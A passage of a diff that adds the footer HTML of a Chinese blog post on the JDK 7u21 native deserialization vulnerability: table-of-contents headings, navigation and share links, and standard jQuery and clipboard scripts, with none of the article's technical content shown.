toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">jdk7u21原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#equalsImpl%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">equalsImpl方法调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B0%83%E7%94%A8equals%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">寻找调用equals的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E7%9A%84%E8%AE%A1%E7%AE%97"><span class="toc-number">1.4.</span> <span class="toc-text">hash的计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=jdk7u21原生反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=jdk7u21原生反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=jdk7u21原生反序列化&body=Check out this article: https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=jdk7u21原生反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=jdk7u21原生反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
